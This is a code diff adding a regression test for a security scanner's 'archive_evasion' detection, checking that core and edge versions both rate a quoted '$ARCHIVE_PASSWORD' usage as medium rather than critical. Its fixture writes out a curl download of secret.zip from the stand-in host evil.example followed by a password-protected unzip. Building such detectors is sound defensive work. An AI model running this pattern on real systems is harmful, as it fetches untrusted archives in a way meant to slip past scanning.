@@ -345,6 +345,28 @@ describe('core <-> edge behavioral fixture parity — archive_evasion (SMI-6033 
     expect(edgeFinding?.severity, 'edge severity must match core').toBe('medium')
   })
 
+  // SMI-6033 Wave 4 bugfix regression: the SAME out-of-band reference above,
+  // just shell-quoted — was misclassified as an inline LITERAL secret because
+  // the CLI-arg capture is raw (quotes included) and SHELL_VAR_REF only
+  // matched a bare `$VAR`, reaching standalone-critical on both surfaces on a
+  // completely benign shell idiom. Pinned here so it can't regress.
+  it('FP: quoted out-of-band "$VAR" password (correlated CLI usage) stays medium, not critical, on core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content =
+      'curl -o secret.zip https://evil.example/secret.zip\nunzip -P "$ARCHIVE_PASSWORD" secret.zip'
+
+    const coreFinding = scanner
+      .scan('parity', content)
+      .findings.find((f: { type: string }) => f.type === 'archive_evasion')
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = edgeRes.findings.find((f: { type: string }) => f.type === 'archive_evasion')
+
+    expect(coreFinding?.severity, 'core severity').toBe('medium')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe('medium')
+  })
+
   // The plan's explicit FP control: a legitimate licensed-font-pack/asset-pack
   // password mention (prose-only, no CLI syntax, no fetch correlation) must
   // stay medium/advisory, never critical, on both core and edge.
